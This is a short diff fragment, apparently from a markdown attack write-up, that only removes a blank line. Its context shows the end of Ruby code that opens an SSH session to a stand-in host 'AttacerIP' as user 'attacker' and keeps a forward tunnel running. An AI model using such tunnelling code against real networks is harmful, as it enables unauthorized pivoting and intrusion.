@@ -83,7 +83,6 @@ Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|
   puts "[+] Starting SSH forward tunnel"
   ssh.loop { true }
 end
-
 ```
 
 
